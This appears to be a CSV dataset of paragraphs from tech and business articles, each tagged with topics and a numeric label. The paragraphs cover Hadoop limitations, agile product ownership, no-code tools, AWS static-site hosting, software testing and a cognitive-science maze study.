1887,"Maybe you estimate effort in terms other than time. I, personally, am unable to think in any other units, so this is what I do. But the goal is to create a list that you (and your manager) can track against. When a PM asks you how the project is going, you can say, Well, Ive accomplished X number of tasks so far. I am currently ahead of/behind schedule, and I have X number of hours/days/units of effort remaining in the project. Thats so much more helpful than the usual, Umm, well, I think Im probably on track. )And again, it is possible (probable?) that you will uncover more questions that should have been asked in step 2 or new functional pieces that should have been outlined in step 3. Surface them now, rinse and repeat.",['Programming'],0
1888,"There are different philosophies and ways of writing pseudocode, and I dont want to be prescriptive about style. For me, what matters is that my pseudocode (A) contains no actual code, and (B) can continue its life as comments in my code when the project is built. I dont even worry too much about design patterns or best practices here. I just get the logic down. An example of pseudocode, the way I write it, would look something like this: Then, if you have a colleague or friend who is willing, have another engineer check your logic for flaws before you execute.",['Programming'],9
1889,"Now its finally time to write some code! Having taken the previous steps, you can now bask in the glory of knowing you wont have to stop mid-project to ask a question about scope or even figure out how the application should work. All youll have to worry about is writing the cleanest, DRY-est, most testable and efficient code you can write. Thats enough on its own, isnt it? And just imagine, with that kind of focus, how much more smoothly your code reviews will go and how many fewer misunderstandings and bugs that are really I built this incorrectly errors youll have to deal with now.",['Programming'],9
1890,"Small File Concerns Slow Processing Speed No Real Time Processing No Iterative Processing Ease of Use Security Problem Lets discuss these Hadoop Limitations in detail -The idea behind Hadoop was to have a small number of large files. But if you have many small files then Hadoop cannot manage it. Small files are those files whose size is quite less than the block size in Hadoop. Each file, directory, and block occupies a memory element inside Name Nodes memory. As a rule of thumb, this memory element is about 150 bytes. So if you have 10 million files each using a block then it would occupy 1.39 GB of memory. Scaling beyond this level is not possible with current hardware. Also Retrieving small files is very inefficient in Hadoop. At the back-end, it causes many disks to seeks and hopping from one datanode to another. It incurs a lot of time.","['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",8
1891,Solution Hadoop Archives or HAR files is one of the solutions to small files problem. Hadoop archives act as another layer of the file system over Hadoop. With Hadoop archive command we can build HAR files. This command runs a map-reduce job at the backend to pack the archived files into a small number of HDFS files. But again reading through HAR files is not much efficient than reading through HDFS. This is because it requires to access two index files and then finally the data file.,"['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",7
1892,"In Hadoop, the Map Reduce reads and writes the data to and from the disk. For every stage in processing the data gets read from the disk and written to the disk. This disk seeks takes time thereby making the whole process very slow. If Hadoop processes data in small volume, it is very slow comparatively. It is ideal for large data sets. As Hadoop has batch processing engine at the core its speed for real-time processing is less. Hadoop is slow in comparison with newer technologies like Spark and Flink.","['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",8
1893,"Hadoop with its core Map-Reduce framework is unable to process real-time data. First, the user loads the file into HDFS. Then the user runs map-reduce job with the file as input. It follows the ETL cycle of processing. The user extracts the data from the source. Then the data gets transformed to meet the business requirements. And finally loaded into the data warehouse. The users can generate insights from this data. The companies use these insights for the betterment of their business.","['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",8
1894,Core Hadoop does not support iterative processing. Iterative processing requires a cyclic data flow. In this output of a previous stage serves as an input to the next stage. Hadoop map-reduce is capable of batch processing. It works on the principle of write-once-read-many. The data gets written on the disk once. And then read multiple times to get insights. The Map-reduce of Hadoop has a batch processing engine at its core. It is not able to iterate through data.,"['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",8
1895,"In Spark, each iteration needs to get scheduled and executed separately. It accomplishes iterative processing through DAG i.e. Spark has RDDs or Resilient Distributed Datasets. These are a collection of elements partitioned across the cluster of nodes. Spark creates RDDs from HDFS files. We can also cache them allowing reusability of RDDs. The iterative algorithms apply operations repeatedly over data. Thus they benefit from RDDs caching across iterations.","['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",8
1896,Flink iterates data using streaming architecture. We can instruct Flink to process only the data which gets changed thereby improving the performance. Flink implements iterative algorithms by defining a step function. It embeds the step functions into special iteration operator. The two variants of this operator areiterate and delta iterate. Both these operators apply the step function over and over again until they meet a terminating condition.,"['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",3
1897,"In Hadoop, we have to hand code each and every operation. This has two drawbacks first it is difficult to use. And second, it increases the number of lines to code. There is no interactive mode available with Hadoop Map-Reduce. This also makes it difficult to debug as it runs in the batch mode. In this mode, we have to specify the jar file, the input as well as the location of the output file. If the program fails in between, it is difficult to find the culprit code.","['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",3
1898,"The limitations of Hadoop and its Map Reduce engine led to the invention of Spark and Flink. These both provide for stream and iterative processing apart from batch processing. They do this with lightning speed as they do in-memory calculations. Hence industry is now switching to Big Data technologies like Apache Spark and Apache Flink. But these technologies use Hadoops HDFS for backend as it still provides a robust data storage system. Furthermore, if you have any query regarding Hadoop Limitations, ask in the comment section.","['Big Data', 'Hadoop Limitations', 'Hadoop Solutions', 'Disadvantages Of Hadoop', 'Hadoop']",8
1899,"Whenever I visit a new city, I am not like most tourists that are captivated by the sights. Rather, I am drawn to the people. I wonder where the people I pass by come from and where they are going. When I moved to San Francisco, I knew that most people were involved in the tech industry in some way. When I walk around the city, I always look at peoples backpacks branded with their company logo. I wonder what their story is and how they contribute to the product whose logo is embroidered on their bag. After all, San Francisco is the mecca for technology. In a world where everyone spends the majority of their leisure time looking down at their cell phones, I often find it difficult to come across short and substantial articles that capture my interest.","['Media', 'Stories', 'Software Development', 'iOS', 'Humans Of New York']",17
1900,"Considering the amount of free material on the web, most people find it illogical to pay for access to content. Newspapers have been substituted by online subscriptions. Most people are busy, but still want to remain informed about current events or read about subjects that interest them. Tech entrepreneurs might turn to sources like Fast Company and Wired, while business people would rather spend their time reading Forbes and Business Insider. Most millenials probably prefer access to free content that is digitized. On the other hand, an older demographic might opt for printed content.","['Media', 'Stories', 'Software Development', 'iOS', 'Humans Of New York']",17
1901,"For even shorter glimpses of current affairs, Twitter has become a popular source. Users can read tweets that condense news articles into 280 characters or less. In addition, Twitter offers a way to keep up with the lives of friends and public figures. Another popular source of information is Reddit, which is a massive forum of topics. Redditors can browse through subreddits, or threads regarding a particular topic, and participate in discussions amongst other users. Platforms like Quora take a question and answer approach where users ask a question and other users, preferably experts on the topic, provide answers.","['Media', 'Stories', 'Software Development', 'iOS', 'Humans Of New York']",17
1902,"Each platform is unique in the way that they transmit information. Whenever I take a breather and need a distraction, I find myself switching between a combination of these applications and am not loyal to a single one. There is a need for a platform where a user can curate his/her own content without the need to browse through multiple sources. Although existing applications offer a wealth of information, they are not customizable. I find myself wasting too much time sifting through content that I am uninterested in. If I can minimize the amount of time that I spend searching for something interesting to read, I can learn more about the topics that truly interest me.","['Media', 'Stories', 'Software Development', 'iOS', 'Humans Of New York']",17
1903,"An application that curates content based on a users interest has no particular target audience. Everyone, from adolescents to adults, uses some sort of application for entertainment purposes or to stay informed. I decided to ask around and see what resources people use to read about their interests. I interviewed three people, each of which belongs to a different age bracket. Mariana, 18, is a college student studying programming in San Francisco. Melanie, 26, is a Software Engineer. Lenny, 56, is a business owner. I asked all three interviewees the same set of questions to get a feel for their personal preferences, specifically: What do you do when you are bored or distracted? Do you use any mobile or web applications for entertainment? What resources do you use to stay informed? Do you prefer to use one or multiple? What topics interest you within these resources? In answering my questions, all three interviewees used some sort of electronic device as a form of diversion. Whether a cell phone or a tablet, electronics were used to access content. Mariana entertains and informs herself using online resources, particularly social media platforms like Facebook and Twitter. We are both drawn to stories about peoples experiences, and she enjoys looking at posts made by Humans of New York. Melanie has an online subscription to The New York Times to stay updated on current events, but prefers to read physical books for entertainment. She enjoys good writing in general, regardless of the genre, and is subscribed to The New Yorker which she accesses online. She is willing to pay for subscriptions if the quality of the writing is better than that of platforms like Medium. Lenny watches the nightly news to stay informed on current events and has an online subscription to The New York Times. He wakes up early in the mornings and reads only the articles that interest him on his i Pad, particularly trending stories. He entertains himself by constantly learning about new topics through online lectures via You Tube. I was able to draw one main conclusion between all three interviewees: there is no single source of information that people frequent for entertainment or information.","['Media', 'Stories', 'Software Development', 'iOS', 'Humans Of New York']",17
1904,"Yet, what about things we cant tell whether they are important? Or we arent sure we wont lose them if we throw them out now? Do not treat the backlog as a wishlist. If you need a wishlist, keep a separate document where you track wishes. Do a pass on your backlog to see whats merely a wish of someone, and what you consider in scope. If its not, move it out.","['Agile', 'Product Backlog', 'Scrum', 'Product Owner']",4
1905,"Next, define the auto scaling policies. For the Core node, set the maximum number of instances to 100 (or some other reasonable value) and the minimum number of instances to 1. Check the boxes for the default Scale out and Scale in rules since they perform well. For the Task node types, set the maximum number of instances to 50 and the minimum number of instances to 0. Check the boxes for the default Scale out and Scale in rules since they perform well. If for whatever reason the default rules arent visible, add them manually. There are two Scale out rules:rule1: Add 1 instance if YARNMemory Available Percentage is less than 15 for 1 five-minute period with a cooldown of 300 seconds.rule2: Add 1 instance if Container Pending Ratio is greater than 0.75 for 1 five-minute period with a cooldown of 300 seconds.",['AWS'],14
1906,"We already learned the No-Code Revolution is here to stay (read more about the No-Code Revolution in Part I of Is Coding Becoming Obsolete?). No-Code development is gradually growing, becoming increasingly advanced and attractive to enterprises, small businesses and entrepreneurial individuals. Every day, visual programing platforms enable non-geeks all over the world to build beautiful and functional web applications without writing a single line of code. At the same time, the No-Code revolution is creating new markets for businesses to explore. (Learn how our company, Zeroqode, was built and bootstrapped in the No-Code industry growing to a team of 20 in just 2 years.) But, what is the purpose of this movement and is it really making code obsolete? SPOILER ALERT: We dont believe the art/skill of writing code is becoming obsolete. Nor do we believe developers will lose their jobs anytime soon. What we do believe is that No-Code is revolutionizing the way Founders, Designers, and Developers build software, by leveraging the power and simplicity of the tools offered, saving time, money and a bunch of headache on the way. And by the way things look like right nowone can only expect this to improve in the years to come.","['Startup', 'Coding', 'Code', 'Designer']",16
1907,"The Lean Startup Methodology (which we covered briefly on in our How to Build an MVP without a technical co-founder and without code) has a different strategy. You get a feeling about what customer problem(s) youd like to solve. Then, you build a simple and inexpensive (read: imperfect) solution to test your idea. As you collect real user feedback, you learn what you are missing in your product and what customers are truly looking for. Listen, learn, make changes then do it all over again, until your product invokes a Wow! The road to success is built by failing fast, cheap and often. Dont get us wrong, we are not encouraging founders to constantly fail. What we are encouraging is constant validation and testing of new hypotheses every step of the way in the real world, not in theory.","['Startup', 'Coding', 'Code', 'Designer']",6
1908,"Designers Articles with a subject lines such as Why Designers Should Code are constantly showing up in designers news feeds. When reading the authors recommendations, the arguments can be convincing. However, designers are practicing design for a reason. If they truly wanted to code, then they would have probably studied development instead. But, how often are designers misunderstood by developers and vice versa? In the argument, we assume all the designers would want is to be able to do it themselves, without having to explain their creative mind to someone too technical.","['Startup', 'Coding', 'Code', 'Designer']",12
1909,"No-Code development platforms give designers the solution to save them from this headache. Exactly the same time and effort they used to spend sketching in Photoshop on static designs, they can now spend building a fully functional app instead. The creative masterminds can achieve pixel-perfect responsive designs, animations and other visual effects, just like they envisioned it. The best part is that now Designers will maintain the power to do it all by themselves. No code needs to be written, no developers involved. It is just about the designer, their project and the functionality behind their design.","['Startup', 'Coding', 'Code', 'Designer']",12
1910,"Now, take a moment and think about that beloved code. Now think about that one bug hidden somewhere in the lines of code. You now have to painstakingly search the entire codebase to spot it. The frustration a developer experiences in such a situation is endless. When bug hunting on No-Code software, you check the human readable workflow sequences using the inbuilt debuggers and inspect toolsnot the entire app structure. If that is not saving you time, we dont know what will.","['Startup', 'Coding', 'Code', 'Designer']",13
1911,"In a conversation with Emmanuel Straschnov, Founder of Bubble, to the question: What are currently the greatest barriers inhibiting people from building websites and applications? He answered: The biggest barrier is the cultural issue people have with visual programming tools. Whether theyre technical or not, people tend to think that if its not code its not real. There is a cultural shift that needs to be done here. The way to remove barriers is by showing real things can be built and can scale on visual tools. Bubble is doing his part here, as we have a few customers who got into YCombinator, raised money and are working on developing their startups.","['Startup', 'Coding', 'Code', 'Designer']",12
1912,"You can be told the names of subtle things, like design principles and design qualities, and you may even come to be able to recite their definitions from memory. Its not something that you can put to use on-demand. Not until youve been reflecting on it for a while within the context of the particular circumstances your own hands-on work.","['Software Development', 'Learning']",0
1913,"Fast forward a number of years and a couple of startups later, and Ive used my nights and weekends to learn how to code. Originally, the impetus was to be totally capable of independently building my own side hustle with the hope of being a solo startup founder and grab some nice passive income. The technical skills gained would obviously help me work with engineers more effectively as a product manager, so committing those nights and weekends to Codecademy and Code School were absolutely worth it. And who would have thought, I actually really enjoyed coding itself! Ive definitely failed launching my own business on multiple occasions, but with every faceplant, my coding abilities grew. It was starting to look less like spaghetti code and more like what I saw my coworkers churn out on the desks next to me as I wrote user stories. If I knew I liked coding this much, I probably would have pursued it in college! Dont take me wrong; I love businessthe strategy, the game theory, the thrill of getting to product-market fit. Yet, the tinker in me, the lego-loving, Rube Goldberg-ing, MS-DOS computer geek kid from decades past surfaces time and time again to remind me that who I am deep inside is a multi-faceted individual. Could I somehow further grow into myself by forming a more perfect union between these two sides of me? In early 2017, I was introduced to the world of blockchain technology. Sure cryptocurrency seemed like the most logical application of the technology, but what really stuck out to me was Ethereumthe decentralized world computer, the true incarnation of what the internet was supposed to be. Immune from the dynamics of late-stage capitalism that inevitably result in oligopolies. This bright, brave ethos spoke to me I had to be involved. My political identity, my moral driving force, and my professions aspirations all aligned with it. I went to Meetups and conferences and events here in NYC, and I spent hours on Reddit and Medium and, yes, even 4chan/biz (the armpit of the internet). As more resources sprouted up in the crypto Cambrian explosion of mid-to-late 2017, I gobbled up every resource I could get my hands on. I taught myself Solidity using Crypto Zombies, Truffles Pet Shop tutorial, and Open Zeppelins Ethernaut. I used Remix and Truffles Ganache to write, compile, migrate, and test smart contracts. By the time I signed up for Consen Sys Academys Ethereum Developer program in summer 2018, I basically knew everything they ended up teaching in the course.","['Blockchain', 'Ethereum', 'Consensys', 'Dapps', 'Technology']",2
1914,"However, in reality, having even the best technological partner on your side does not guarantee success. Software development is way more complicated that writing code. Its all about the people and interactions, not the tools and processes. Quoting friend of mine You dont need to have a great team to build amazing products. Its the team spirit, engagement, tight collaboration and mutual respect that makes the biggest difference. World is full of beautifully designed and built products that never reached adoption.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",12
1915,"Team comes to you to inform that integration with external payment provider will take two months. Biggest obstacles comes from the fact that having fully automated withdrawals policy is extremely hard. 3rd party provider uses legacy, unstable API with dozens of corner cases. Unfortunately, thats the crucial part of your system and you cant go live without it. Well, it turns out you have plenty of options:shout at developers and tell them to find a better solutionaccept the inevitable and deal with the consequencesswitch 3rd party payment provider and hope for the bestignore the problem and cry silentlyhope they were wronglook for the other, business acceptable solution Smart Product Owner would go with the last option. One possibility is to implement semi automated solution which schedules withdrawals in an automated way, but uses operations to review and accept on periodical basis. After all, product is not alive yet and you dont have customers.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",10
1916,"Truth is that no one knows it better than you. After all, its you who spent hundreds of hours thinking about it, playing different scenarios in your head and talking with customers. You did all the hard work to raise funds and explore your personal network in search of first employees. Who can be better for the job of Product Owner if not you? But do you really have time for it? Team is in the middle of a sprint adding first features to the web based version of the platform. In the meantime, you did amazing sales pitch at the conference. Many people approached you asking for the mobile version of the app. Literally, no one even considered the web. Its obvious that you need to do it sooner than later.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",17
1917,"More than 10 years in the software development industry thought me one thing. In 9/10 cases there is more work to be done than people involved in the project. Moreover, teams get overly ambitious plans from product owners long before the work begins. All in all, since sprint one software developers are in a rush, even a single week of unplanned absence can make a difference. Not to mention lack of time for innovation or research. Effect is easy to predictoverdue projects, unhappy developers and angry customers.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",1
1918,"Development started, things are going great accordingly to the plan. Software developers nail down features in the speed of light, UX agency finishes designs, new people join the team. Few sprints into the project, new features appear one after the other. After all, how come one can release an application that does not have multi-factor authentication or user management module. Integration with 3rd party provider didnt go that well. There is some technical work to be done etc.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",1
1919,"In his famous book Drive: The Surprising Truth About What Motivates Us Daniel H. Pink points out three main motivatorsautonomy, mastery and purpose. Its well known truth that when you micromanage, team loses feel of a control and shortly after a desire to go beyond expectations. Things start to get slower and in the effect no one has sense of control or purpose. So why do we do it? As always, it all starts with good intentions. Quite likely, over the course of development team will make mistakes. Some of them are hard to predict, but others are surprisingly stupid. Question is, can you let them be wrong from time to time to build sense of ownership and commitment or will you make all hard decisions for them? On one head, each potential mistake means lost of time and money, on the other hand its the interference in the most basic motivators. Moreover, you are paying a professional custom software development company for their services.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",4
1920,"Building a product is extremely fun and rewarding experience. You need to think about the users, their experience, added value and various business models. Then coordinate activities between marketing agency, custom software development company and other 3rd parties. Not to mention countless questions, discussions and hard decisions waiting for you to save the world. Pure fun that creates feeling of purpose and fulfillment. Easy to get entirely lost into it. And this is what most business owners does.","['Agile', 'Startup', 'Entrepreneur', 'Entrepreneurship', 'Software Development']",0
1921,"Managing the exploration vs exploitation trade-off is an important part of our everyday lives. It can be seen in tasks like choosing what music to listen to. A person can exploit their knowledge of their music collection and be guaranteed a good experience or can explore a friends playlist to find something better. However, they also risk finding something worse. The dilemma is the same despite the context: does one exploit their knowledge to acquire a satisfactory solution or explore other options to find a better alternative. Despite the importance the trade-off plays in our daily lives, it isnt completely understood. This series of articles details a study working towards unraveling the mystery of how people manage the exploration exploitation trade-off.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",4
1922,"Most psychological studies are conducted by behavioral research. Researchers gather a group of people and observe them perform some task. Afterword, a theory is developed to explain the subjects performance. Theories developed with this method can only accurately describe the observations made. This is a problem because there is no way to measure the mind. Therefore, some conjecture is required to describe how the mind processes information relevant to the task. Fortunately, computers offer a more formal approach.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",5
1923,"Researchers can empirically test their theories through simulation in a process referred to as mind design. The idea is to develop a computer program that simulates a virtual mind according to a theory. The program is made to perform the same task as human subjects, allowing performance between the two to be compared. This enables researchers to see if the theory emulates reality. Their are two major benefits of using a computer in this way. First, it forces the theory to be more formal as it must be translated into step by step instructions a computer can follow. Thus, the theory will paint a more complete picture of how the mind works. Second, if the theory has flaws, components of the simulation can easily be changed and simulations can be rerun. This enables researchers to improve their theories faster. However, up until recently, mind design has been missing a key component.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",5
1924,"Originally simulations of the mind were small due to limitations in processing power, allowing only the mind to be simulated. However, the body plays an important role in cognition. It is the means by which a human exists and is responsible for the health of the mind. Disturbances in the regulatory function of the body such as a lack of: food, water, or sleep, lead to impairments in thought. Therefore, the body plays an essential role in decision making. Since the origin of mind design, computers have become more powerful, allowing more complicated models to be developed. Now a holistic simulation of decision making can be made by incorporating both physical and mental processes. Tools have been developed to assist researchers in developing such digital minds.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",5
1925,"A cognitive architecture is a functional simulation of cognition. Numerous architectures exist such as: ACT-R, Soar, and EPIC. These simulate the mind alone, but as mentioned earlier, a bodily simulation should be included as well. Thats where the hybrid cognitive architecture ACT-R/ comes into play. It combines the ACT-R theory of cognition with Hum Mods physiological simulation system and theory from affective neuroscience. In order to understand how ACT-R/ works, a basic understanding of ACT-R and Hummod is necessary.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",5
1926,"ACT-R/ connects Hummod, a physiological simulation of a human, to ACT-R. Hummod simulates anything from hormone concentration and regulation to blood pressure. Therefore, it provides ACT-R with a virtual body. In addition, ACT-R/ creates a bridge enabling the bodily processes in Hum Mod to affect the mental processes in ACT-R (and vice versa). Thus concentrations of hormones influence behavior and behavior affects the regulation of hormones. Overall, ACT-R/ is a connected theory of memory, learning, decision making, and physiological function, making it the perfect tool to develop a holistic model of human decision making.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",5
1927,"The model will play a symbolic maze task. The concept was created by Wai Tat Fu and John Anderson; they utilized the maze to test learning mechanisms in ACT-R in their 2006 paper From Recurrent Choice to Skill Learning. The players goal is that of any maze: find the exit. However, the mazes structure is fundamentally different. Instead of using a series of forked paths like a normal maze, a symbolic maze uses a series of connected rooms. In Fus experiment each room contained an object and two elements (of four possible ones) in it. Selecting an element moves the player from room to room and is equivalent to turning in a regular maze. Objects are used once and are uniquely related to an element in its room. As such it is simultaneously an indicator of where the player is and reveals which element they should select. Since the maze is a collection of rooms, the layout of the maze is also different.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",14
1928,"The picture shows that the maze is setup in a tree structure. Squares represent rooms; they are given an identification number for convenience. The player begins the game in room one. The green arrows represent the correct path the player should take. The last row of circles depicts the ends of every path. Xs are considered dead ends and the C is the exit. If the player reaches a dead end, they are reset to the point where they diverged from the correct path (the last room where they could have followed a green arrow). For instance, take a player who makes a correct decision in the first room. This will take them to room three. Now, assume they make an incorrect decision there and eventually reach a dead end after passing through room six. After reaching the dead end, they will be moved back into room three where they can continue their journey.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",14
1929,"At this point, the game seems rather easy. If the player ever returns to the same room, pick a different element and eventually they will reach the exit. To fix this, multiple objects are placed inside a single room. When the player returns they are shown another object. Furthermore, objects in the same room are allowed to have different answers, so players will have to traverse the maze multiple times to learn all of the objects in each room. On top of that, players arent provided immediate feedback on their performance. They are only told whether they have reached a dead end or the exit. Therefore, the player can track which level of the maze they are in, but will rarely know the specific room. If they dont know what room they are in, they cannot group the objects they have seen together, making a brute force strategy difficult. It is important to note that each player will traverse the maze more than once.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",14
1930,"The actual experiment requires players and the model to play the game multiple times. Playing more than once forces players to encounter different objects within the same room. Through successive iterations of the game players will become more familiar with the maze. They will learn how objects and elements are related and can exploit their knowledge of it to reach the exit faster. Therefore, the task shows the management of the trade-off. However, it only shows one aspect of it. In order to observe the reverse transition (exploiting to exploring) a subtle change has to be made.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",14
1931,"In order to make the player go back to an exploratory state, portions of the maze will change over time. After a while, the player will discover all of the correct paths to the exit. As the player gets close to accomplishing that, they will be exploiting their knowledge of the maze to complete it faster. Changing which elements objects are associated to in various rooms forces the player to reconsider what they know. If they determine their previous knowledge is incorrect they will have stop exploiting and explore the maze once more. Therefore, the symbolic maze is a task that can show how a person manages the exploration exploitation trade-off. Now that a task has been selected, it has to be implemented.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",14
1932,"The maze was built in Project Malmo because of its visual representation and expandability. The visuals help keep subjects engaged in the task. A text based version is rather boring to play and can cause players to doze off. Using a three dimensional and colorful world like Minecrafts keeps subjects engaged with the task, resulting in increased performance and better data. With better data comes a better standard to compare the model against. The explandability of Project Malmo is another major benefit. Malmo can be used to construct varied environments with differing complexities from the same primitives. Therefore, different aspects of human behavior can be studied by modifying the existing environment, which will speed up future work.","['Artificial Intelligence', 'Cognition', 'Cognitive Science', 'Bacsr']",14
1933,"A good way to explain unit testing is by example. Say we have a function written in pseudocode like so: The unit test might look something like this: Notice how were only testing for what this function does and nothing else. Any dependent operations, like a network call, are mocked or functionally faked to resolve to a predetermined result. If your application runs inside a framework of some kind, it will usually be ignored in favor of just running the unit of code in question. In general, wed like a test only the unit. In this case: the function and its expected behavior.","['Software Development', 'Software Testing', 'Software', 'Software Engineering', 'Reliability Engineering']",13
1934,"The user acceptance test or UAT might just be the ultimate of all tests mentioned here. It throws automated validations and calculated metrics out the door and instead puts the final judgement of the correctness of your software in the hands of its user. A UAT usually happens right after or before the delivery of an application to production. An end user is presented with the application and is encouraged to use it as they would normally. The acceptance criteria is pretty simple: does the software do what its supposed to do for the user according to the user? You could think of all the other types of testing we discussed here as servant to this final type. Ultimately, everything we do to make quality software is some way in service to the users of that software. We might have the most robust unit tests, ran our app through the battery of the hardest performance and load tests, and executed every E2E scenario imaginable. But in the end if the user doesnt get what they need, its all pointless. However, we should still hold ourselves to a high standard of software quality. Eventually, that benefit should reach your users through less bugs, faster and more frequent delivery to production, and more flexibility to add features.","['Software Development', 'Software Testing', 'Software', 'Software Engineering', 'Reliability Engineering']",13
1935,"Hosting a static website on AWS comes with a numerous of advantages. A couple of examples: You dont have to worry about server costs, just pay for the numbers of requests to your website. If you dont get any visitors, you dont pay for it. I will not go into prices in this article, but this setup wont cost you much. With AWS Cloud Fronts edge locations your site is loaded within milliseconds all around the world. Its basically a Content Delivery Network (CDN). AWS S3 is a managed object storage service, you dont have to worry about server capacity. FTP deployments are outdated, deploy your website quickly with AWS Code Pipeline and AWS Codebuild.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",11
1936,"Besides a distributed network, Cloud Front will also offload our SSL certificate. No more manual server configuration needed to get HTTPS on your website. Cloud Front will handle this for us. It will even redirect all your HTTP traffic to HTTPS on your site. SSL certificates comes free for usage on AWS with the convenient certificate manager. The certificate manager will generate and auto-renew your SSL certificates easily.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",11
1937,"In this modal type a bucket name. Its important to use the same bucket name as your domain name. So if your domain is my Domain.com, your bucket name should be my Domain.com. Select a region where you would like to store your website files. Note that this region doesnt need to be the region where you expect most traffic from since we will be using Cloud Front, in the end, to handle low latency for us Click on next to configure any properties for the bucket. We dont need to set any of these options for your use case so leave these empty. Click on next again to configure the bucket permissions.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",11
1938,Select Use this bucket to host a website. Now we have to specify an index document. This document is your file which will be requested when you go to the bucket endpoint listed above in your browser. Please do save this endpoint as we need it in a later stage to configure the Cloud Front distribution. The file we are going to use as the index is index.html. We dont need to set an error document as this will be handled by Cloud Front.,"['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",7
1939,"If you already have any distributions, they will be listed here. To create our new distribution click the big blue button on the top left Create Distribution. When you do this, you will be asked what type of distribution you want. Since we will be hosting a website, we will choose Web for our use case. In the next screen, we will configure all our settings for our distribution.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",6
1940,"First of all, remember that S3 endpoint which you saved? You need it now and needs to be placed as Origin Domain Name. Dont use the suggestion by AWS here as it will conflict with Jekyll Leave Origin Path empty. You can also leave the Origin ID to the auto-generated id by AWS. The Origin id is just an identifier to point to your origin. It can be everything you want and doesnt really matter how its named as long as it is unique. Leave Origin Custom Headers empty as we will not need it right now.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",7
1941,"To begin with the Price class. This depends on what you want to do. Do you want to deploy the distribution to all edge cases? If you do this, it will give you the best performance for the end user since the distribution will be the closest to his location. A downside of selecting this value is: updates to the CDN will take a little longer than selecting the other values. Since it has to update more servers. In my opinion, it is worth the little extra wait for the end user though.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",8
1942,"You have created a Cloud Front distribution for your website. You can see its status on the Cloud Front overview page. Make sure you copy and save the domain name. We will use it when configuring Route53. It will take a while to deploy your distribution, but it will be worth it! Once your distribution is deployed, we will take a quick look to Route53 and configure your DNS records to direct users to your Cloud Front distribution. Select the Route53 service from the services menu and navigate to Hosted Zones. Click on the blue button Create Hosted Zone. Here you have to specify which domain you want to create the hosted zone for. Enter your custom domain and leave all other settings to their default.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",11
1943,"The last step we need to do is to set your A-Records to direct traffic to your Cloud Front distribution. We can do this by pressing Create Record Set. In total, we need to configure two A-Records. One for the root domain, so the name for this one will be empty. In that case, the name will be www Type should have already defaulted to A - IPv4 address. Alias should be set to yes, so you can specify your Cloud Front distribution from the list when clicking on Alias target. Leave the other settings to their default and click create. This is the last step in your AWS configuration for the user to see your website on your custom domain.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",7
1944,"Codebuild automatically created a service role in IAM. We now go to this role by selecting the IAM service and go to roles on the left side menu. Select the role you specified earlier. Click on the policy that has been already defined by Codebuild and edit the policy. You have to grant Read and Write permissions on the S3 bucket where your website files are located. Next, to that you also have to give permission for Cloud Front to be able to List Invalidations, Create Invalidations and Get Invalidations.","['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",7
1945,Go to the Code Pipeline service and click on Create pipeline. It should be self-explained what you need to fill in. Use AWS Codebuild as Build provider and select the Codebuild project we created earlier. We will not be using a Deployment provider so leave that to No deployment. Use the standard service role for Code Pipeline.,"['AWS', 'Serverless', 'DevOps', 'Cloud', 'Technology']",7
1946,"Video coding standards are instantiated in software or hardware with goals as varied as research, broadcasting, or streaming. A reference encoder is a software implementation used during the video standardization process and for research, and as a reference by implementers. Generally, this is the first implementation of a standard and not used for production. Afterward, production encoders developed by the open-source community or commercial entities come along. These are practical implementations deployed by most companies for their encoding needs and are subject to stricter speed and resource constraints. Therefore, the performance of reference and production encoders might be substantially different. Besides, the standard profile and specific version influence the observed performance, especially for a new standard with still immature implementations. Netflix deploys production encoders tuned to achieve the highest subjective quality for streaming.","['Video', 'Compression', 'Standards', 'Video Quality', 'Netflix']",16
